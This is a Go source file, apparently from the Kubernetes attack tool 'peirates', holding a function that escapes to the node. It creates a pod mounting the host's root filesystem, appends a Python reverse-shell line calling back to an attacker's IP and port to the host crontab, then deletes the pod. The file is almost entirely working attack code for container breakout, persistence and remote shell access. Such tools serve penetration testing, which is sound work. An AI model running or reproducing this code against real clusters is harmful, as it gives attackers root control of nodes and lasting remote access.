package peirates

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"
	"regexp"
	"strings"
	"time"
)

// MountRootFS creates a pod that mounts its node's root filesystem.
func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP, callbackPort string) {
	var MountInfoVars = MountInfo{}
	var err error

	// First, confirm we're allowed to create pods
	if !kubectlAuthCanI(connectionString, "create", "pod") {
		println("[-] AUTHORIZATION: this token isn't allowed to create pods in this namespace")
		return
	}
	// TODO: changing parsing to occur via JSON
	// TODO: check that image exists / handle failure by trying again with the next youngest pod's image or a named pod's image

	// Approach 1: Try to get the image file for my own pod
	//./kubectl describe pod `hostname`| grep Image:
	hostname := os.Getenv("HOSTNAME")
	approach1Success := false
	var image string
	podDescriptionRaw, _, err := runKubectlSimple(connectionString, "describe", "pod", hostname)
	if err != nil {
		approach1Success = false
		println("[-] DEBUG: describe pod didn't work")
	} else {
		podDescriptionLines := strings.Split(string(podDescriptionRaw), "\n")
		for _, line := range podDescriptionLines {
			start := strings.Index(line, "Image:")
			if start != -1 {
				// Found an Image line -- now get the image
				image = strings.TrimSpace(line[start+6:])
				println("[+] Using your current pod's image:", image)
				approach1Success = true

				MountInfoVars.image = image
			}
		}
		if !approach1Success {
			println("[-] DEBUG: did not find an image line in your pod's definition.")
		}
	}

	if !approach1Success {
		// Approach 2 - use the most recently staged running pod
		//
		// TODO: re-order the list and stop the for loop as soon as we have the first running or as soon as we're able to make one of these work.

		// Future version of approach 2:
		// 	Let's make something to mount the root filesystem, but not pick the most recent one.  Rather,
		// it should populate a list of all pods in the current namespace, then iterate through
		// images trying to find one that has a shell.

		// Here's the useful part of that data.

		// type PodDetails struct {
		// 	Items      []struct {
		// 		Metadata   struct {
		// 			Name            string `json:"name"`
		// 			Namespace       string `json:"namespace"`
		// 		} `json:"metadata"`
		// 		Spec struct {
		// 			Containers []struct {
		// 				Image           string `json:"image"

		println("Getting image from the most recently-staged pod in thie namespace")
		getImagesRaw, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "wide", "--sort-by", "metadata.creationTimestamp")
		if err != nil {
			// If this fails, just go back to the menu.
			println("[-] ERROR: Could not get pods")
			return
		}

		emptyString := regexp.MustCompile(`^\s*$`)
		getImageLines := strings.Split(string(getImagesRaw), "\n")
		for _, line := range getImageLines {
			if !emptyString.MatchString(line) {
				//added checking to only enumerate running pods
				// TODO: check for potential bug: did we enumerate only running pods as intended?
				MountInfoVars.image = strings.Fields(line)[7]
			}
		}
	}

	//create random string
	randomString := randSeq(6)

	// Create pod manifest in YAML
	// TODO: The file creation should use mktemp() or similar.
	MountInfoVars.yamlBuild = fmt.Sprintf(`apiVersion: v1
kind: Pod
metadata:
  annotations:
  labels:
  name: attack-pod-%s
  namespace: %s
spec:
  containers:
  - image: %s
    imagePullPolicy: IfNotPresent
    name: attack-container
    command: ["/bin/sh","-c","sleep infinity"]
    volumeMounts:
    - mountPath: /root
      name: mount-fsroot-into-slashroot
  restartPolicy: Never
  volumes:
  - name: mount-fsroot-into-slashroot
    hostPath:
       path: /
`, randomString, connectionString.Namespace, MountInfoVars.image)

	// Write yaml file out to current directory
	error := ioutil.WriteFile("attack-pod.yaml", []byte(MountInfoVars.yamlBuild), 0600)
	if error != nil {
		println("[-] Unable to write file: attack-pod.yaml")
		return
	}

	_, _, err = runKubectlSimple(connectionString, "apply", "-f", "attack-pod.yaml")
	if err != nil {
		println("[-] Pod did not stage successfully.")
		return
	} else {
		attackPodName := "attack-pod-" + randomString
		println("[+] Executing code in " + attackPodName + " - please wait for Pod to stage")
		time.Sleep(5 * time.Second)
		stdin := strings.NewReader("*  *    * * *   root    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callbackIP + "\"," + callbackPort + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'\n")
		stdout := bytes.Buffer{}
		stderr := bytes.Buffer{}
		err := runKubectlWithConfig(connectionString, stdin, &stdout, &stderr, "exec", "-it", attackPodName, "--", "/bin/sh", "-c", "cat >> /root/etc/crontab")

		if err != nil {
			// BUG: when we remove that timer above and thus get an error condition, program crashes during the runKubectlSimple instead of reaching this message
			println("[-] Exec into that pod failed. If your privileges do permit this, the pod may have needed more time.  Use this main menu option to try again: Run command in one or all pods in this namespace.")
			return
		} else {
			println("[+] Netcat callback added sucessfully.")
			println("[+] Removing attack pod.")
			err := runKubectlWithConfig(connectionString, stdin, &stdout, &stderr, "delete", "pod", attackPodName)
			if err != nil {
				println("May not have been able to delete attack pod.", err)
			}

		}
	}
}
